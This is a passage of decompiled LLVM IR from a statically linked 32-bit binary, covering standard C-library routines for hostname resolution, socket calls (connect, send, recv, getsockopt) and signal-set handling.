  %stack_var_-4 = alloca i32, align 4
  %v0_8049e97 = call i32 @__GI___h_errno_location()
  %v0_8049e9c = load i32, i32* @edx, align 4
  %v2_8049e9f = ptrtoint i32* %stack_var_-4 to i32
  %v9_8049eb7 = call i32 @gethostbyname_r(i32 %arg1, i32* nonnull @global_var_80524ec.31, i32 ptrtoint (i32* @global_var_8052320.30 to i32), i32 460, i32 %v2_8049e9f, i32 %v0_8049e97, i32 %v0_8049e9c, i32 %v0_8049e9c)
  %v3_8049ebc = load i32, i32* %stack_var_-4, align 4
  ret i32 %v3_8049ebc
}

define i32 @gethostbyname_r(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  %tmp18 = ptrtoint i32* %arg2 to i32
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %v0_8049ec4 = load i32, i32* @ebp, align 4
  %v0_8049ec5 = load i32, i32* @edi, align 4
  %v0_8049ec6 = load i32, i32* @esi, align 4
  %v0_8049ec7 = load i32, i32* @ebx, align 4
  store i32 %arg3, i32* @ebp, align 4
  store i32 %arg4, i32* @ebx, align 4
  %v1_8049ed7 = inttoptr i32 %arg5 to i32*
  store i32 0, i32* %v1_8049ed7, align 4
  store i32 22, i32* %eax.global-to-local, align 4
  %v4_8049ee2 = icmp eq i32 %arg1, 0
  br i1 %v4_8049ee2, label %dec_label_pc_804a1ee, label %dec_label_pc_8049eed

dec_label_pc_8049eed:                             ; preds = %entry
  %v1_8049eed = call i32 @__errno_location(i32 %v0_8049ec7)
  store i32 %v1_8049eed, i32* %eax.global-to-local, align 4
  %v1_8049ef2 = inttoptr i32 %v1_8049eed to i32*
  %v2_8049ef2 = load i32, i32* %v1_8049ef2, align 4
  store i32 %v2_8049ef2, i32* @edi, align 4
  store i32 %v1_8049eed, i32* @esi, align 4
  store i32 0, i32* %v1_8049ef2, align 4
  %v0_8049f05 = load i32, i32* @ebx, align 4
  store i32 %v0_8049f05, i32* %stack_var_-108, align 4
  %v7_8049f11 = call i32 @__get_hosts_byname_r(i32 %arg1, i32 2, i32 %tmp18, i32 %v0_8049f05, i32 %arg5, i32 %arg6, i32 %v1_8049eed)
  store i32 %v7_8049f11, i32* %eax.global-to-local, align 4
  %v1_8049f19 = icmp eq i32 %v7_8049f11, 0
  br i1 %v1_8049f19, label %dec_label_pc_804a1ee, label %dec_label_pc_8049f21

dec_label_pc_8049f21:                             ; preds = %dec_label_pc_8049eed
  %v1_8049f25 = inttoptr i32 %arg6 to i32*
  %v2_8049f25 = load i32, i32* %v1_8049f25, align 4
  store i32 %v2_8049f25, i32* %edx.global-to-local, align 4
  %v9_8049f27 = icmp eq i32 %v2_8049f25, 1
  br i1 %v9_8049f27, label %dec_label_pc_8049f41, label %dec_label_pc_8049f2c

dec_label_pc_8049f2c:                             ; preds = %dec_label_pc_8049f21
  %v9_8049f2c = icmp eq i32 %v2_8049f25, 4
  br i1 %v9_8049f2c, label %dec_label_pc_8049f41, label %dec_label_pc_8049f31

dec_label_pc_8049f31:                             ; preds = %dec_label_pc_8049f2c
  %v1_8049f31 = add i32 %v2_8049f25, 1
  %v8_8049f31 = icmp eq i32 %v1_8049f31, 0
  store i32 %v1_8049f31, i32* %edx.global-to-local, align 4
  %v1_8049f32 = icmp eq i1 %v8_8049f31, false
  br i1 %v1_8049f32, label %dec_label_pc_804a1ee, label %dec_label_pc_8049f38

dec_label_pc_8049f38:                             ; preds = %dec_label_pc_8049f31
  %v0_8049f38 = load i32, i32* @esi, align 4
  %v1_8049f38 = inttoptr i32 %v0_8049f38 to i32*
  %v2_8049f38 = load i32, i32* %v1_8049f38, align 4
  %v11_8049f38 = icmp eq i32 %v2_8049f38, 2
  %v1_8049f3b = icmp eq i1 %v11_8049f38, false
  br i1 %v1_8049f3b, label %dec_label_pc_804a1ee, label %dec_label_pc_8049f41

dec_label_pc_8049f41:                             ; preds = %dec_label_pc_8049f38, %dec_label_pc_8049f2c, %dec_label_pc_8049f21
  %v0_8049f41 = load i32, i32* @ebp, align 4
  %v1_8049f43 = sub i32 0, %v0_8049f41
  %v1_8049f45 = urem i32 %v1_8049f43, 4
  %v2_8049f45 = icmp eq i32 %v1_8049f45, 0
  store i32 %v1_8049f45, i32* %eax.global-to-local, align 4
  %v0_8049f48 = load i32, i32* @edi, align 4
  %v1_8049f48 = load i32, i32* @esi, align 4
  %v2_8049f48 = inttoptr i32 %v1_8049f48 to i32*
  store i32 %v0_8049f48, i32* %v2_8049f48, align 4
  %v0_8049f5c.pre = load i32, i32* @ebx, align 4
  br i1 %v2_8049f45, label %dec_label_pc_8049f58, label %dec_label_pc_8049f4c

dec_label_pc_8049f4c:                             ; preds = %dec_label_pc_8049f41
  %v1_8049f4c = load i32, i32* %eax.global-to-local, align 4
  %v2_8049f4c = sub i32 %v0_8049f5c.pre, %v1_8049f4c
  %v7_8049f4c = icmp ult i32 %v0_8049f5c.pre, %v1_8049f4c
  br i1 %v7_8049f4c, label %dec_label_pc_804a1e9, label %dec_label_pc_8049f54

dec_label_pc_8049f54:                             ; preds = %dec_label_pc_8049f4c
  %v0_8049f54 = load i32, i32* @ebp, align 4
  %v2_8049f54 = add i32 %v0_8049f54, %v1_8049f4c
  store i32 %v2_8049f54, i32* @ebp, align 4
  store i32 %v2_8049f4c, i32* @ebx, align 4
  br label %dec_label_pc_8049f58

dec_label_pc_8049f58:                             ; preds = %dec_label_pc_8049f41, %dec_label_pc_8049f54
  %v0_8049f5c = phi i32 [ %v2_8049f4c, %dec_label_pc_8049f54 ], [ %v0_8049f5c.pre, %dec_label_pc_8049f41 ]
  store i32 %arg6, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %v1_8049f25, align 4
  %tmp41 = icmp ult i32 %v0_8049f5c, 4
  br i1 %tmp41, label %dec_label_pc_804a1e9, label %dec_label_pc_8049f6b

dec_label_pc_8049f6b:                             ; preds = %dec_label_pc_8049f58
  %v0_8049f6b = load i32, i32* @ebx, align 4
  %v1_8049f6b = add i32 %v0_8049f6b, -4
  store i32 %v1_8049f6b, i32* %eax.global-to-local, align 4
  %tmp42 = icmp ult i32 %v1_8049f6b, 8
  br i1 %tmp42, label %dec_label_pc_804a1e9, label %dec_label_pc_8049f77

dec_label_pc_8049f77:                             ; preds = %dec_label_pc_8049f6b
  %v1_8049f77 = add i32 %v0_8049f6b, -12
  store i32 %v1_8049f77, i32* %eax.global-to-local, align 4
  %v0_8049f7a = load i32, i32* @ebp, align 4
  %v1_8049f7a = add i32 %v0_8049f7a, 4
  store i32 %v1_8049f7a, i32* %edx.global-to-local, align 4
  store i32 %v1_8049f7a, i32* %stack_var_-92, align 4
  %v3_8049f83 = inttoptr i32 %v1_8049f7a to i32*
  store i32 %v0_8049f7a, i32* %v3_8049f83, align 4
  %v0_8049f86 = load i32, i32* %edx.global-to-local, align 4
  %v1_8049f86 = add i32 %v0_8049f86, 4
  %v2_8049f86 = inttoptr i32 %v1_8049f86 to i32*
  store i32 0, i32* %v2_8049f86, align 4
  %tmp43 = icmp ult i32 %v1_8049f77, 32
  br i1 %tmp43, label %dec_label_pc_804a1e9, label %dec_label_pc_8049f93

dec_label_pc_8049f93:                             ; preds = %dec_label_pc_8049f77
  %v0_8049f93 = load i32, i32* @ebx, align 4
  %v1_8049f93 = add i32 %v0_8049f93, -44
  store i32 %v1_8049f93, i32* @ebx, align 4
  %tmp44 = icmp ult i32 %v1_8049f93, 256
  br i1 %tmp44, label %dec_label_pc_804a1e9, label %dec_label_pc_8049fa6

dec_label_pc_8049fa6:                             ; preds = %dec_label_pc_8049f93
  %v0_8049fa6 = load i32, i32* @ebp, align 4
  %v1_8049fa6 = add i32 %v0_8049fa6, 12
  %v1_8049fad = add i32 %v0_8049fa6, 44
  store i32 %v1_8049fad, i32* @edi, align 4
  store i32 %v1_8049fad, i32* %stack_var_-108, align 4
  %v4_8049fba = inttoptr i32 %v1_8049fad to i8*
  %v5_8049fba = call i32 @strncpy(i8* %v4_8049fba, i32 %arg1, i32 %v1_8049f93, i32 %v1_8049fa6)
  %v0_8049fbf = load i32, i32* @edi, align 4
  %v1_8049fbf = load i32, i32* @ebp, align 4
  %v2_8049fbf = add i32 %v1_8049fbf, 12
  %v3_8049fbf = inttoptr i32 %v2_8049fbf to i32*
  store i32 %v0_8049fbf, i32* %v3_8049fbf, align 4
  %v1_8049fc6 = add i32 %v0_8049fa6, 16
  %v2_8049fc6 = inttoptr i32 %v1_8049fc6 to i32*
  store i32 0, i32* %v2_8049fc6, align 4
  %v2_8049fcd = load i32, i32* %stack_var_-108, align 4
  store i32 %v2_8049fcd, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* @edx, align 4
  %v0_8049fcf = load i32, i32* @ebp, align 4
  store i32 %arg1, i32* %stack_var_-108, align 4
  %v2_8049fd4 = inttoptr i32 %arg1 to i8*
  %v3_8049fd4 = call i32 @inet_aton(i8* %v2_8049fd4, i32 %v0_8049fcf)
  store i32 %v3_8049fd4, i32* %eax.global-to-local, align 4
  %v1_8049fdc = icmp eq i32 %v3_8049fd4, 0
  br i1 %v1_8049fdc, label %dec_label_pc_804a018, label %dec_label_pc_8049fe0

dec_label_pc_8049fe0:                             ; preds = %dec_label_pc_8049fa6
  store i32 %tmp18, i32* %edx.global-to-local, align 4
  %v0_8049fe4 = load i32, i32* @edi, align 4
  store i32 %v0_8049fe4, i32* %arg2, align 4
  %v1_8049fe6 = add i32 %tmp18, 8
  %v2_8049fe6 = inttoptr i32 %v1_8049fe6 to i32*
  store i32 2, i32* %v2_8049fe6, align 4
  %v0_8049fed = load i32, i32* %edx.global-to-local, align 4
  %v1_8049fed = add i32 %v0_8049fed, 12
  %v2_8049fed = inttoptr i32 %v1_8049fed to i32*
  store i32 4, i32* %v2_8049fed, align 4
  %v2_8049ff4 = load i32, i32* %stack_var_-92, align 4
  %v1_8049ff7 = load i32, i32* %edx.global-to-local, align 4
  %v2_8049ff7 = add i32 %v1_8049ff7, 16
  %v3_8049ff7 = inttoptr i32 %v2_8049ff7 to i32*
  store i32 %v2_8049ff4, i32* %v3_8049ff7, align 4
  %v1_8049ffe = load i32, i32* %edx.global-to-local, align 4
  %v2_8049ffe = add i32 %v1_8049ffe, 4
  %v3_8049ffe = inttoptr i32 %v2_8049ffe to i32*
  store i32 %v1_8049fa6, i32* %v3_8049ffe, align 4
  %v0_804a005 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_804a005, i32* %v1_8049ed7, align 4
  store i32 0, i32* %v1_8049f25, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804a1ee

dec_label_pc_804a018:                             ; preds = %dec_label_pc_8049fa6
  %v0_804a018 = call i32 @__open_nameservers()
  store i32 %v0_804a018, i32* @eax, align 4
  %v2_804a028 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_804a028, i32* @ebx, align 4
  store i32 %v2_804a028, i32* %stack_var_-108, align 4
  %v2_804a02d = call i32 @__pthread_return_void(i32 %v2_804a028, i32 134526871)
  store i32 %v2_804a02d, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_8052160.32 to i32), i32* %stack_var_-108, align 4
  %v1_804a039 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8052160.32 to i32))
  %v0_804a03e = load i32, i32* @global_var_8054994.33, align 4
  store i32 %v0_804a03e, i32* @esi, align 4
  store i32 ptrtoint (i32* @global_var_8052160.32 to i32), i32* @ecx, align 4
  store i32 134526871, i32* @eax, align 4
  store i32 %v2_804a028, i32* %stack_var_-108, align 4
  %v2_804a049 = call i32 @__pthread_return_void(i32 %v2_804a028, i32 1)
  store i32 1, i32* %edx.global-to-local, align 4
  %v2_804a064 = ptrtoint i32* %stack_var_-76 to i32
  %v2_804a069 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_804a069, i32* %eax.global-to-local, align 4
  store i32 %v2_804a069, i32* %stack_var_-108, align 4
  %v0_804a073 = load i32, i32* @esi, align 4
  %v7_804a07a = call i32 @__dns_lookup(i8* %v2_8049fd4, i32 1, i32 %v0_804a073, i32 ptrtoint (i32* @global_var_8054988.34 to i32), i32 %v2_804a069, i32 %v2_804a064)
  store i32 %v7_804a07a, i32* %eax.global-to-local, align 4
  %v2_804a082 = icmp slt i32 %v7_804a07a, 0
  %v1_804a084 = icmp eq i1 %v2_804a082, false
  br i1 %v1_804a084, label %dec_label_pc_804a09a, label %dec_label_pc_804a086

dec_label_pc_804a086:                             ; preds = %dec_label_pc_804a018
  store i32 2, i32* %eax.global-to-local, align 4
  store i32 1, i32* %v1_8049f25, align 4
  br label %dec_label_pc_804a1ee

dec_label_pc_804a09a:                             ; preds = %dec_label_pc_804a018
  store i32 0, i32* %edx.global-to-local, align 4
  store i32 256, i32* %eax.global-to-local, align 4
  %v10_804a0ad = icmp ugt i32 %v1_8049f93, 256
  %v15_804a0ad = icmp eq i32 %v0_8049f93, 300
  %v2_804a0b1 = or i1 %v10_804a0ad, %v15_804a0ad
  br i1 %v2_804a0b1, label %dec_label_pc_804a14c, label %dec_label_pc_804a0b3

dec_label_pc_804a0b3:                             ; preds = %dec_label_pc_804a09a
  %v3_804a0b6 = load i32, i32* %stack_var_-76, align 4
  store i32 %v3_804a0b6, i32* %stack_var_-108, align 4
  %v1_804a0ba = call i32 @free(i32 %v3_804a0b6)
  store i32 %v1_804a0ba, i32* %eax.global-to-local, align 4
  store i32 %v3_804a0b6, i32* @edi, align 4
  %v3_804a0c0 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_804a0c0, i32* %stack_var_-108, align 4
  %v1_804a0c4 = call i32 @free(i32 %v3_804a0c0)
  store i32 -1, i32* %v1_8049f25, align 4
  store i32 34, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804a1c4

dec_label_pc_804a14c:                             ; preds = %dec_label_pc_804a09a
  %v3_804a151.pre = load i32, i32* %stack_var_-76, align 4
  %v0_804a155.pre = load i32, i32* @edi, align 4
  store i32 %v0_804a155.pre, i32* %stack_var_-108, align 4
  %v4_804a156 = inttoptr i32 %v0_804a155.pre to i8*
  %v5_804a156 = call i32 @strncpy(i8* %v4_804a156, i32 %v3_804a151.pre, i32 %v1_8049f93, i32 %v2_804a028)
  store i32 %v5_804a156, i32* %eax.global-to-local, align 4
  %v3_804a15c = load i32, i32* %stack_var_-76, align 4
  store i32 %v3_804a15c, i32* %stack_var_-108, align 4
  %v1_804a160 = call i32 @free(i32 %v3_804a15c)
  store i32 %v1_804a160, i32* %eax.global-to-local, align 4
  %v12_804a168 = icmp eq i32 %tmp10, 1
  %v1_804a16d = icmp eq i1 %v12_804a168, false
  br i1 %v1_804a16d, label %dec_label_pc_804a1c9, label %dec_label_pc_804a16f

dec_label_pc_804a16f:                             ; preds = %dec_label_pc_804a14c
  %v0_804a16f = load i32, i32* @edx, align 4
  %v0_804a176 = load i32, i32* @ebp, align 4
  store i32 %v0_804a176, i32* %stack_var_-108, align 4
  %v3_804a177 = inttoptr i32 %tmp to i16*
  %v4_804a177 = call i32 @memcpy(i16* %v3_804a177, i32 4, i32 %v0_804a16f)
  store i32 %tmp18, i32* %eax.global-to-local, align 4
  %v0_804a180 = load i32, i32* @edi, align 4
  store i32 %v0_804a180, i32* %arg2, align 4
  %v1_804a182 = add i32 %tmp18, 8
  %v2_804a182 = inttoptr i32 %v1_804a182 to i32*
  store i32 2, i32* %v2_804a182, align 4
  %v0_804a189 = load i32, i32* %eax.global-to-local, align 4
  %v1_804a189 = add i32 %v0_804a189, 12
  %v2_804a189 = inttoptr i32 %v1_804a189 to i32*
  store i32 4, i32* %v2_804a189, align 4
  %v3_804a190 = load i32, i32* %stack_var_-92, align 4
  store i32 %v3_804a190, i32* %edx.global-to-local, align 4
  %v1_804a194 = load i32, i32* %eax.global-to-local, align 4
  %v2_804a194 = add i32 %v1_804a194, 16
  %v3_804a194 = inttoptr i32 %v2_804a194 to i32*
  store i32 %v3_804a190, i32* %v3_804a194, align 4
  %v1_804a19b = load i32, i32* %eax.global-to-local, align 4
  %v2_804a19b = add i32 %v1_804a19b, 4
  %v3_804a19b = inttoptr i32 %v2_804a19b to i32*
  store i32 %v1_8049fa6, i32* %v3_804a19b, align 4
  %v2_804a19e = load i32, i32* %stack_var_-108, align 4
  store i32 %v2_804a19e, i32* %eax.global-to-local, align 4
  %v3_804a19f = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_804a19f, i32* %stack_var_-108, align 4
  %v1_804a1a3 = call i32 @free(i32 %v3_804a19f)
  store i32 %tmp18, i32* %edx.global-to-local, align 4
  store i32 %tmp18, i32* %v1_8049ed7, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 0, i32* %v1_8049f25, align 4
  br label %dec_label_pc_804a1c4

dec_label_pc_804a1c4:                             ; preds = %dec_label_pc_804a1c9, %dec_label_pc_804a0b3, %dec_label_pc_804a16f
  br label %dec_label_pc_804a1ee

dec_label_pc_804a1c9:                             ; preds = %dec_label_pc_804a14c
  %v3_804a1cc = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_804a1cc, i32* %stack_var_-108, align 4
  %v1_804a1d0 = call i32 @free(i32 %v3_804a1cc)
  store i32 1, i32* %v1_8049f25, align 4
  store i32 2, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804a1c4

dec_label_pc_804a1e9:                             ; preds = %dec_label_pc_8049f93, %dec_label_pc_8049f77, %dec_label_pc_8049f6b, %dec_label_pc_8049f58, %dec_label_pc_8049f4c
  store i32 34, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804a1ee

dec_label_pc_804a1ee:                             ; preds = %dec_label_pc_8049f38, %dec_label_pc_8049f31, %dec_label_pc_8049eed, %entry, %dec_label_pc_804a1c4, %dec_label_pc_804a086, %dec_label_pc_8049fe0, %dec_label_pc_804a1e9
  store i32 %v0_8049ec7, i32* @ebx, align 4
  store i32 %v0_8049ec6, i32* @esi, align 4
  store i32 %v0_8049ec5, i32* @edi, align 4
  store i32 %v0_8049ec4, i32* @ebp, align 4
  %v0_804a1f5 = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_804a1f5

; uselistorder directives
  uselistorder i32 %v2_804a028, { 0, 2, 1, 4, 3, 5 }
  uselistorder i32 %v1_8049fad, { 1, 0, 2 }
  uselistorder i32 %v1_8049fa6, { 2, 1, 0 }
  uselistorder i32 %v1_8049f93, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v0_8049f5c.pre, { 0, 2, 1 }
  uselistorder i32 %v1_8049f45, { 1, 0 }
  uselistorder i32 %v2_8049f25, { 2, 0, 1, 3 }
  uselistorder i32* %v1_8049f25, { 5, 4, 3, 2, 1, 0, 6 }
  uselistorder i32* %v1_8049ed7, { 1, 0, 2 }
  uselistorder i32* %stack_var_-76, { 1, 0, 2, 3 }
  uselistorder i32 %tmp18, { 6, 5, 0, 4, 1, 3, 2 }
  uselistorder i32* %eax.global-to-local, { 27, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 28 }
  uselistorder i32 %arg6, { 2, 1, 0 }
  uselistorder i32 %arg1, { 5, 4, 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_804a1ee, { 7, 4, 5, 6, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_804a1c4, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8049f58, { 1, 0 }
}

define i32 @__libc_connect(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_804a213 = ptrtoint i32* %stack_var_-12 to i32
  %v2_804a21a = call i32 @__socketcall(i32 3, i32 %v2_804a213)
  ret i32 %v2_804a21a

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @getsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-20, align 4
  %v2_804a24f = ptrtoint i32* %stack_var_-20 to i32
  %v2_804a256 = call i32 @__socketcall(i32 15, i32 %v2_804a24f)
  ret i32 %v2_804a256

; uselistorder directives
  uselistorder i32* %stack_var_-20, { 1, 0 }
}

define i32 @__libc_recv(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-16, align 4
  %v2_804a283 = ptrtoint i32* %stack_var_-16 to i32
  %v2_804a28a = call i32 @__socketcall(i32 10, i32 %v2_804a283)
  ret i32 %v2_804a28a

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0 }
}

define i32 @__libc_send(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-16, align 4
  %v2_804a2b7 = ptrtoint i32* %stack_var_-16 to i32
  %v2_804a2be = call i32 @__socketcall(i32 9, i32 %v2_804a2b7)
  ret i32 %v2_804a2be

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0 }
}

define i32 @socket(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_804a2e3 = ptrtoint i32* %stack_var_-12 to i32
  %v2_804a2ea = call i32 @__socketcall(i32 1, i32 %v2_804a2e3)
  ret i32 %v2_804a2ea

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
  uselistorder i32 (i32, i32)* @__socketcall, { 4, 3, 0, 2, 1 }
}

define i32 @__bsd_signal(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %stack_var_-140 = alloca i32, align 4
  %stack_var_-300 = alloca i32, align 4
  %v0_804a2f4 = load i32, i32* @ebx, align 4
  %v15_804a2f5 = ptrtoint i32* %stack_var_-300 to i32
  store i32 %arg2, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v10_804a309 = icmp eq i32 %arg2, -1
  br i1 %v10_804a309, label %dec_label_pc_804a317, label %dec_label_pc_804a30e

dec_label_pc_804a30e:                             ; preds = %entry
  %tmp16 = icmp slt i32 %arg1, 1
  br i1 %tmp16, label %dec_label_pc_804a317, label %dec_label_pc_804a312

dec_label_pc_804a312:                             ; preds = %dec_label_pc_804a30e
  %v7_804a315 = icmp sgt i32 %arg1, 64
  br i1 %v7_804a315, label %dec_label_pc_804a317, label %dec_label_pc_804a324

dec_label_pc_804a317:                             ; preds = %dec_label_pc_804a312, %dec_label_pc_804a30e, %entry
  %v1_804a317 = call i32 @__errno_location(i32 %v0_804a2f4)
  store i32 %v1_804a317, i32* %eax.global-to-local, align 4
  %v1_804a31c = inttoptr i32 %v1_804a317 to i32*
  store i32 22, i32* %v1_804a31c, align 4
  br label %dec_label_pc_804a398

dec_label_pc_804a324:                             ; preds = %dec_label_pc_804a312
  store i32 %arg2, i32* %stack_var_-144, align 4
  store i32 31, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804a332

dec_label_pc_804a332:                             ; preds = %dec_label_pc_804a332.dec_label_pc_804a332_crit_edge, %dec_label_pc_804a324
  %v0_804a332 = phi i32 [ %v15_804a2f5, %dec_label_pc_804a324 ], [ %v0_804a332.pre, %dec_label_pc_804a332.dec_label_pc_804a332_crit_edge ]
  %v1_804a33d17 = phi i32 [ 31, %dec_label_pc_804a324 ], [ %v1_804a33d, %dec_label_pc_804a332.dec_label_pc_804a332_crit_edge ]
  %v2_804a332 = mul i32 %v1_804a33d17, 4
  %v3_804a332 = add i32 %v2_804a332, 160
  %v4_804a332 = add i32 %v3_804a332, %v0_804a332
  %v5_804a332 = inttoptr i32 %v4_804a332 to i32*
  store i32 0, i32* %v5_804a332, align 4
  %v0_804a33d.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_804a33d = add i32 %v0_804a33d.pre, -1
  %v9_804a33d = icmp slt i32 %v1_804a33d, 0
  store i32 %v1_804a33d, i32* %eax.global-to-local, align 4
  %v1_804a33e = icmp eq i1 %v9_804a33d, false
  br i1 %v1_804a33e, label %dec_label_pc_804a332.dec_label_pc_804a332_crit_edge, label %dec_label_pc_804a340

dec_label_pc_804a332.dec_label_pc_804a332_crit_edge: ; preds = %dec_label_pc_804a332
  %v0_804a332.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804a332

dec_label_pc_804a340:                             ; preds = %dec_label_pc_804a332
  %v0_804a340 = load i32, i32* @edx, align 4
  %v2_804a343 = ptrtoint i32* %stack_var_-140 to i32
  store i32 %v2_804a343, i32* %eax.global-to-local, align 4
  %v4_804a34b = call i32 @__sigaddset(i32 %v2_804a343, i32 %arg1, i32 %v0_804a340, i32 %v0_804a340)
  store i32 %v4_804a34b, i32* %eax.global-to-local, align 4
  %v2_804a353 = icmp slt i32 %v4_804a34b, 0
  br i1 %v2_804a353, label %dec_label_pc_804a398, label %dec_label_pc_804a357

dec_label_pc_804a357:                             ; preds = %dec_label_pc_804a340
  %v4_804a35f = call i32 @__sigismember(i32 ptrtoint (i32* @global_var_8054580.35 to i32), i32 %arg1, i32 %v4_804a34b, i32 %v4_804a34b)
  %v2_804a378 = ptrtoint i32* %stack_var_-284 to i32
  %v2_804a37d = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_804a37d, i32* %eax.global-to-local, align 4
  %v4_804a386 = call i32 @__libc_sigaction(i32 %arg1, i32* nonnull %stack_var_-144, i32 %v2_804a378)
  store i32 %v4_804a386, i32* %eax.global-to-local, align 4
  %v2_804a38e = icmp slt i32 %v4_804a386, 0
  br i1 %v2_804a38e, label %dec_label_pc_804a398, label %dec_label_pc_804a392

dec_label_pc_804a392:                             ; preds = %dec_label_pc_804a357
  %v3_804a392 = load i32, i32* %stack_var_-284, align 4
  br label %dec_label_pc_804a39b

dec_label_pc_804a398:                             ; preds = %dec_label_pc_804a357, %dec_label_pc_804a340, %dec_label_pc_804a317
  br label %dec_label_pc_804a39b

dec_label_pc_804a39b:                             ; preds = %dec_label_pc_804a392, %dec_label_pc_804a398
  %storemerge = phi i32 [ -1, %dec_label_pc_804a398 ], [ %v3_804a392, %dec_label_pc_804a392 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 %v0_804a2f4, i32* @ebx, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_804a33d, { 2, 1, 0 }
  uselistorder i32* %stack_var_-144, { 0, 2, 1 }
  uselistorder i32* %eax.global-to-local, { 9, 1, 2, 3, 4, 6, 5, 0, 7, 8 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 3, 2, 1, 4, 0, 5 }
  uselistorder label %dec_label_pc_804a39b, { 1, 0 }
}

define i32 @__sigismember(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_804a3b2 = add i32 %arg2, -1
  %v1_804a3b5 = urem i32 %v1_804a3b2, 32
  %v2_804a3b5 = icmp eq i32 %v1_804a3b5, 0
  %v2_804a3b8 = udiv i32 %v1_804a3b2, 32
  br i1 %v2_804a3b5, label %bb5, label %bb

bb:                                               ; preds = %entry
  %v5_804a3bb = shl i32 1, %v1_804a3b5
  br label %bb5

bb5:                                              ; preds = %entry, %bb
  %v6_804a3bd = phi i32 [ 1, %entry ], [ %v5_804a3bb, %bb ]
  %v2_804a3bd = mul nuw nsw i32 %v2_804a3b8, 4
  %v3_804a3bd = add i32 %v2_804a3bd, %arg1
  %v4_804a3bd = inttoptr i32 %v3_804a3bd to i32*
  %v5_804a3bd = load i32, i32* %v4_804a3bd, align 4
  %v7_804a3bd = and i32 %v5_804a3bd, %v6_804a3bd
  %v8_804a3bd = icmp eq i32 %v7_804a3bd, 0
  %v1_804a3c1 = icmp eq i1 %v8_804a3bd, false
  %v2_804a3c1 = zext i1 %v1_804a3c1 to i32
  ret i32 %v2_804a3c1

; uselistorder directives
  uselistorder i32 %v1_804a3b5, { 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @__sigaddset(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_804a3c8 = load i32, i32* @ebx, align 4
  store i32 %v0_804a3c8, i32* %stack_var_-4, align 4
  %v1_804a3d6 = add i32 %arg2, -1
  %v1_804a3d9 = urem i32 %v1_804a3d6, 32
  %v2_804a3d9 = icmp eq i32 %v1_804a3d9, 0
  store i32 %v1_804a3d9, i32* @ecx, align 4
  br i1 %v2_804a3d9, label %bb6, label %bb

bb:                                               ; preds = %entry
  %v5_804a3dc = shl i32 1, %v1_804a3d9
  br label %bb6

bb6:                                              ; preds = %entry, %bb
  %v6_804a3e1 = phi i32 [ 1, %entry ], [ %v5_804a3dc, %bb ]
  %v2_804a3de = udiv i32 %v1_804a3d6, 32
  store i32 %v2_804a3de, i32* @edx, align 4
